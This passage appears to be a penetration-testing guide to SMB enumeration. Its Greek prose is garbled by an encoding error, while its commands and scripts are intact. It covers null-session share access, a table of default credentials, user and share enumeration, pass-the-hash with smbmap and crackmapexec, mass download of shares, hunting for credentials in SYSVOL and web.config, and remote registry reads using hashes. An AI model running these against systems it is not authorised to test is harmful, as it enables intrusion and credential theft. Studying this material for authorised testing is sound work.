### **Î£Î¬ÏÏ‰ÏƒÎ·** ÎµÎ½ÏŒÏ‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… Î±Î½Î±Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚ Î¿Î¹ÎºÎ¿Î´ÎµÏƒÏ€ÏŒÏ„ÎµÏ‚:

```bash
nbtscan -r 192.168.0.1/24
```

### ÎˆÎºÎ´Î¿ÏƒÎ· Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® SMB

Î“Î¹Î± Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏ„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… SMB, ÎµÎ¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï€Î¿Î¹Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹. Î•Î¬Î½ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´ÎµÎ½ ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î¬Î»Î»Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ:

* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ **MSF** Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚ \_**auxiliary/scanner/smb/smb\_version**
* Î‰ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿:

```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```

### **Î‘Î½Î±Î¶Î®Ï„Î·ÏƒÎ· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚**

```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```

### **Î Î¹Î¸Î±Î½Î¬** Î”Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±

| **ÎŒÎ½Î¿Î¼Î± Î§ÏÎ®ÏƒÏ„Î·**     | **Î£Ï…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î¿Î¹ ÎºÏ‰Î´Î¹ÎºÎ¿Î¯ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**       |
| -------------------- | ---------------------------------------- |
| _(ÎºÎµÎ½ÏŒ)_             | _(ÎºÎµÎ½ÏŒ)_                                 |
| guest                | _(ÎºÎµÎ½ÏŒ)_                                 |
| Administrator, admin | _(ÎºÎµÎ½ÏŒ)_, password, administrator, admin |
| arcserve             | arcserve, backup                         |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                  |
| backupexec, backup   | backupexec, backup, arcada               |
| test, lab, demo      | password, test, lab, demo                |

### Î•Ï€Î¯Î¸ÎµÏƒÎ· Î’Î¯Î±Ï‚

* [**Î•Ï€Î¯Î¸ÎµÏƒÎ· Î’Î¯Î±Ï‚ ÏƒÏ„Î¿ SMB**](../../generic-methodologies-and-resources/brute-force.md#smb)

### Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ SMB

### Î‘Ï€ÏŒÎºÏ„Î·ÏƒÎ· Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½

```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```

### Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Î§ÏÎ·ÏƒÏ„ÏÎ½, ÎŸÎ¼Î¬Î´Ï‰Î½ & Î§ÏÎ·ÏƒÏ„ÏÎ½ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡Î¿Ï…Î½ Î®Î´Î· ÏƒÏ…Î»Î»ÎµÏ‡Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿ enum4linux ÎºÎ±Î¹ Ï„Î¿ enum4linux-ng

```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```

### Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Ï„Î¿Ï€Î¹ÎºÏÎ½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)

```bash
lookupsid.py -no-pass hostname.local
```

ÎœÎ¿Î½Î¿Î³ÏÎ±Î¼Î¼Î®

```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

### Metasploit - Î‘Ï€Î±ÏÎ¹Î¸Î¼ÏÎ½Ï„Î±Ï‚ Ï„Î¿Ï…Ï‚ Ï„Î¿Ï€Î¹ÎºÎ¿ÏÏ‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚

```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```

### **Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· LSARPC ÎºÎ±Î¹ SAMR rpcclient**

{% content-ref url="rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](rpcclient-enumeration.md)
{% endcontent-ref %}

### Î£ÏÎ½Î´ÎµÏƒÎ· GUI Î±Ï€ÏŒ Ï„Î¿ Linux

#### Î£Ï„Î¿ Ï„ÎµÏÎ¼Î±Ï„Î¹ÎºÏŒ:

`xdg-open smb://cascade.htb/`

#### Î£Ï„Î¿ Ï€Î±ÏÎ¬Î¸Ï…ÏÎ¿ Ï„Î¿Ï… Ï†Î±ÎºÎ­Î»Î¿Ï… (nautilus, thunar, ÎºÎ»Ï€)

`smb://friendzone.htb/general/`

## Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· ÎšÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Ï‰Î½ Î¦Î±ÎºÎ­Î»Ï‰Î½

### Î›Î¯ÏƒÏ„Î± ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Ï‰Î½ Ï†Î±ÎºÎ­Î»Ï‰Î½

Î Î¬Î½Ï„Î± ÏƒÏ…Î½Î¹ÏƒÏ„Î¬Ï„Î±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¿Ï„Î¹Î´Î®Ï€Î¿Ï„Îµ, Î±Î½ Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î± **null** **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±/ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„Î·Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚**.

```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

### **Î£ÏÎ½Î´ÎµÏƒÎ·/Î›Î¯ÏƒÏ„Î± ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Î¿Ï… Ï†Î±ÎºÎ­Î»Î¿Ï…**

```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```

### **Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ Ï„Ï‰Î½ Windows ÎºÎ±Î¹ ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÎµ Î±Ï…Ï„Î­Ï‚**

Î•Î½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± ÎµÎ¯ÏƒÏ„Îµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿Î¹ ÏƒÏ„Î·Î½ ÎµÎ¼Ï†Î¬Î½Î¹ÏƒÎ· Î¿Ï€Î¿Î¹Ï‰Î½Î´Î®Ï€Î¿Ï„Îµ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ Ï„Î¿Ï… Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®-ÏƒÏ„ÏŒÏ‡Î¿Ï… ÎºÎ±Î¹ ÏŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ, Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î¹Ï‚ Î¿Ï€Î¿Î¯ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î¾Î¯Î¶ÎµÎ¹ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î± ÏƒÎµ Î¼Î¹Î± ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ·. Î“Î¹Î± Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î±, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÏˆÎ¬Î¾ÎµÏ„Îµ Î³Î¹Î± Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ NT\_STATUS\_ACCESS\_DENIED ÎºÎ±Î¹ NT\_STATUS\_BAD\_NETWORK\_NAME, ÏŒÏ„Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ Î¼Î¹Î± Î­Î³ÎºÏ…ÏÎ· ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± (Ï€.Ï‡. ÎºÎµÎ½Î® ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Î® Î­Î³ÎºÏ…ÏÎ± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±). Î‘Ï…Ï„Î¬ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Ï…Î½ ÎµÎ¬Î½ Î· ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÎ±Î¹ Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„Î®Î½ Î® ÎµÎ¬Î½ Î· ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÎ±Î¸ÏŒÎ»Î¿Ï….

Î£Ï…Î½Î®Î¸ÎµÎ¹Ï‚ Î¿Î½Î¿Î¼Î±ÏƒÎ¯ÎµÏ‚ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ Î³Î¹Î± ÏƒÏ„ÏŒÏ‡Î¿Ï…Ï‚ Windows ÎµÎ¯Î½Î±Î¹:

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Î£Ï…Î½Î®Î¸ÎµÎ¹Ï‚ Î¿Î½Î¿Î¼Î±ÏƒÎ¯ÎµÏ‚ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ Î±Ï€ÏŒ Ï„Î¿ _**Network Security Assessment 3Î· Î­ÎºÎ´Î¿ÏƒÎ·**_)

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÎµ Î±Ï…Ï„Î­Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î®

```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```

Î® Î±Ï…Ï„ÏŒ Ï„Î¿ script (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± null ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±)

```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```

### Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±

ÎœÎµÏÎ¹ÎºÎ¬ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Î½ SMB Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½:

* Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ ÏƒÏ„Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ SMB Î³Î¹Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±
* Î§ÏÎ®ÏƒÎ· ÎµÏÎ³Î±Î»ÎµÎ¯Ï‰Î½ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Responder Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹Ï‚ Î±Ï€Î¿ÎºÎ»Î¯ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ· SMB ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚
* Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Î½ ÎºÎ¿Î¹Î½Î®Ï‚ Ï‡ÏÎ®ÏƒÎ·Ï‚ (share) Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Î¹ Ï†Î±ÎºÎ­Î»Î¿Ï…Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Î¿Î¹ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Ï€ÏÏ‰Ï„Î¿ÎºÏŒÎ»Î»Î¿Ï… SMB

```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```

### **Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ Î±Ï€ÏŒ Windows / Ï‡Ï‰ÏÎ¯Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„ÏÎ¯Ï„Ï‰Î½**

PowerShell

```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```

ÎšÎ¿Î½ÏƒÏŒÎ»Î± CMD

```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```

MMC Snap-in (Î³ÏÎ±Ï†Î¹ÎºÏŒ)

```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```

```html
explorer.exe (Î³ÏÎ±Ï†Î¹ÎºÏŒ), ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ `\\<ip>\` Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ Î¼Î· ÎºÏÏ…Ï†Î­Ï‚ ÎºÎ¿Î¹Î½Î­Ï‚ Ï‡ÏÎ®ÏƒÎµÎ¹Ï‚.

### Î¤Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÏ„Îµ Î­Î½Î± ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Î¿ Ï†Î¬ÎºÎµÎ»Î¿
```

```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```

### **Î›Î®ÏˆÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½**

Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï„Î¹Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ ÎµÎ½ÏŒÏ„Î·Ï„ÎµÏ‚ Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€Ï‰Ï‚ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ Î¼Îµ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±/Pass-the-Hash.

```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```

### Î‘Î½Î±Î¶Î®Ï„Î·ÏƒÎ· ÎšÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Ï‰Î½ Î¦Î±ÎºÎ­Î»Ï‰Î½ Domain

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*

```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) Î±ÏÎ¬Ï‡Î½Î·.
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`

```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```

Î•Î¹Î´Î¹ÎºÎ¬ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î±Ï€Î¿Ï„ÎµÎ»Î¿ÏÎ½ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Î¼Îµ Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± **`Registry.xml`** ÎºÎ±Î¸ÏÏ‚ **Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î³Î¹Î± Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î¼Îµ **Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ·** Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚. Î‰ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± **`web.config`** ÎºÎ±Î¸ÏÏ‚ Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±.

{% hint style="info" %}
Î¤Î¿ **SYSVOL share** ÎµÎ¯Î½Î±Î¹ **Î±Î½Î±Î³Î½ÏÏƒÎ¹Î¼Î¿** Î±Ï€ÏŒ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÏƒÏ„Î¿Î½ Ï„Î¿Î¼Î­Î±. Î•ÎºÎµÎ¯ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î²ÏÎµÎ¯Ï„Îµ** Ï€Î¿Î»Î»Î¬ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ ÎµÎ½Ï„Î¿Î»ÏÎ½, VBScript ÎºÎ±Î¹ PowerShell.\
Î˜Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ** Ï„Î± **scripts** Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„ÏŒ ÎºÎ±Î¸ÏÏ‚ ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± **Î²ÏÎµÎ¯Ï„Îµ** ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ **ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**.
{% endhint %}

## Î”Î¹Î¬Î²Î±ÏƒÎ¼Î± Ï„Î¿Ï… ÎœÎ·Ï„ÏÏÎ¿Ï…

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ Î¼Î·Ï„ÏÏÎ¿** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎºÎ¬Ï€Î¿Î¹Î± Î±Î½Î±ÎºÎ±Î»Ï…Ï†Î¸Î­Î½Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±. Î¤Î¿ Impacket **`reg.py`** ÏƒÎ¬Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ:

```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
